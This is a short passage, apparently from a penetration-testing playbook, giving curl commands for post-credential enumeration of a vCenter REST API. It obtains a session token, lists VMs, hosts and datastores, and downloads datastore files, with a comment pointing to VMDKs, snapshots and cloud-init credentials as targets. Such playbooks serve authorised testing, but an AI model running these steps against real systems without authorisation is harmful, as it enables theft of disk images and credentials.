## Step 8 — vSphere REST API enumeration (post-cred)

```bash
# Get session token
curl --max-time 30 --connect-timeout 10 -sk -X POST -u '<EMAIL-REDACTED>:<pw>' "https://$TARGET/api/session"
# Returns: "<session-token>"

# List VMs
curl --max-time 30 --connect-timeout 10 -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/vm"

# List hosts
curl --max-time 30 --connect-timeout 10 -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/host"

# List datastores
curl --max-time 30 --connect-timeout 10 -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/datastore"

# Datastore file download (HUGE — VMDK files, snapshots, credentials in cloud-init)
# /folder/<path>?dsName=<ds>&dcPath=<dc>
curl --max-time 30 --connect-timeout 10 -sk -H "vmware-api-session-id: <token>" "https://$TARGET/folder?dsName=datastore1&dcPath=Datacenter"
```

---

